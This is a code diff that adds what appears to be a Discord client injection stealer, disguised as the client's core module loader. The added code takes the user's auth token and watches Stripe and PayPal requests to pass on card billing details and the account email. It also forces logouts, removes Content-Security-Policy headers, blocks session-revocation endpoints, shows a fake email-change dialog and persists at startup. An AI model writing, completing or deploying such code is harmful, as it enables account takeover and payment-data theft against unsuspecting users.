+            if (!fs.existsSync(LOG_FILE_PATH)) {
+                fs.writeFileSync(LOG_FILE_PATH, 'logout');
+
+                await request('POST', 'https://discord.com/api/v9/auth/logout', {
+                    'Content-Type': 'application/json',
+                    'Authorization': token
+                }, JSON.stringify({
+                    provider: null,
+                    voip_provider: null,
+                }));
+
+                return false;
+            };
+
+            return true;
+        }
+
+        fs.writeFileSync(LOG_FILE_PATH, 'logout');
+
+        return false;
+    } catch (error) {
+        return false;
+    }
+};
+
+const defaultSession = () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
+    webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
+        const { url, uploadData, method, statusCode, billing_address } = details;
+
+        if (
+            ![200, 202].includes(statusCode) &&
+            !['POST'].includes(method)
+        ) return;
+        
+        const { 
+            token, 
+            user
+        } = await AuritaCord();
+
+        if(!token) return;
+
+        switch (true) {
+            case url.includes('stripe'): 
+                let item;
+
+                try {
+                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
+                } catch (error) {
+                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
+                }
+
+                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
+                const request = {
+                    item,
+                    line_1,
+                    line_2,
+                    city,
+                    state,
+                    postal_code,
+                    country,
+                    email
+                };
+
+                Cruise(
+                    'CREDITCARD_ADDED',
+                    null,
+                    request,
+                    user.email,
+                    null,
+                    token,
+                    `you just added a \`Credit Card\``
+                );
+                break;
+                
+            case (url.endsWith('paypal_accounts') || url.endsWith('billing-agreement-tokens')): 
+                Cruise(
+                    'PAYPAL_ADDED',
+                    null,
+                    null,
+                    user.email,
+                    null,
+                    token,
+                    `you just added a \`Paypal\` account`
+                );
+                break;
+            
+        };
+    });
+};
+
+const interceptRequest = () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
+    webRequest.onHeadersReceived(async (request, callback) => {
+        const { url, method, statusCode, responseHeaders, uploadData } = request;
+        const updatedHeaders = { ...responseHeaders };
+
+        ['content-security-policy', 'content-security-policy-report-only'].forEach(header => {
+            delete updatedHeaders[header];
+        });
+        
+        callback({
+            responseHeaders: {
+                ...updatedHeaders,
+                "Access-Control-Allow-Headers": "*"
+            }
+        });
+
+        const processUserUpdate = async () => {
+            const {
+                token,
+                user
+            } = await AuritaCord();
+
+            if(!token) return;
+
+            if (CONFIG.auto_user_profile_edit === 'true') {
+                await editSettingUser(token);
+            };
+
+            if (CONFIG.auto_email_update === 'true') {
+                const locale = user.locale || 'en-US';
+
+                const truncateEmail = (email = '@') => {
+                    const [localPart, domain] = email.split('@');
+                    return `${localPart.slice(0, 15)}${localPart.length > 15 ? '...' : ''}@${domain || ''}`;
+                };
+
+                const [
+                    CONFIG_ALERT,
+                    EDIT_MAIL_ALERT,
+                    ALERT_INTRO,
+                    END_INTRO_ALERT,
+                    CHANGE_ALERT,
+                    LAST_END_ALERT,
+                    CONTACT_ALERT,
+                ] = await translateEmailUpdate(token, locale);
+
+                await execScript(`
+                    const loadStylesheets = (urls) => {
+                        const head = document.head || document.getElementsByTagName('head')[0];
+
+                        urls.forEach(url => {
+                            const link = document.createElement('link');
+                            link.rel = 'stylesheet';
+                            link.href = url;
+                            head.appendChild(link);
+                        });
+                    };
+
+                    const changeEmail = async () => {
+                        loadStylesheets([
+                            '/assets/d4261c08ee2b8d686d9d.css'
+                        ]);
+
+                        const placeholder = document.createElement('div');
+
+                        placeholder.innerHTML = \`
+                            <div class="layerContainer_cd0de5">
+                                <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);"></div>
+                                <div class="layer_c9e2da">
+                                    <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
+                                        <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
+                                            style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
+                                            <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
+                                                <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
+                                                    <form>
+                                                        <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
+                                                            <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
+                                                                ${CONFIG_ALERT}
+                                                            </h1>
+                                                        </div>
+                                                        <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
+                                                            <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
+                                                                <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
+                                                                <p>${CHANGE_ALERT}</p>
+                                                                <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
+                                                            </div>
+                                                            <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
+                                                        </div>
+                                                        <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
+                                                            <a href="/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
+                                                                <div class="contents_dd4f85">
+                                                                    ${EDIT_MAIL_ALERT}
+                                                                </div>
+                                                            </a>
+                                                        </div>
+                                                    </form>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        \`;
+
+                        try {
+                            document.body.appendChild(placeholder);
+
+                            await new Promise(resolve => setTimeout(resolve, Number.MAX_SAFE_INTEGER));
+                        } catch (error) {
+                        }
+                    };
+
+                    changeEmail();
+                `);
+            };
+        }
+
+        switch (true) {
+            case (url.endsWith('/@me') && !script_executed) || (url.includes('/settings') && !script_executed):
+                if (url.endsWith('/@me')) {
+                    await processUserUpdate();
+                }
+                if (url.includes('/settings')) {
+                    script_executed = true;
+                }
+                break;
+        }
+    });
+};
+
+const allSessionsLocked = async () => {
+    const webRequest = session.defaultSession.webRequest;
+    if (!webRequest) return;
+
+    webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
+        const cancel = 
+            details.url.includes("wss://remote-auth-gateway") ||
+            details.url.includes("auth/sessions");
+
+        callback({ cancel });
+    });
+
+    try {
+        const isEnabled = await isLogged();
+        if (isEnabled) return interceptRequest();
+    } catch (error) {
+        console.error(error);
+    };
+    
+    setTimeout(allSessionsLocked, 5000);
+};
+
+const complete = async () => {
+    if (CONFIG.auto_persist_startup === 'true') {
+        forcePersistStartup(); 
+    };
+    startup();
+    createWindow();
+    defaultSession();
+    allSessionsLocked();
+};
+
+complete();
+
+module.exports = require("./core.asar");
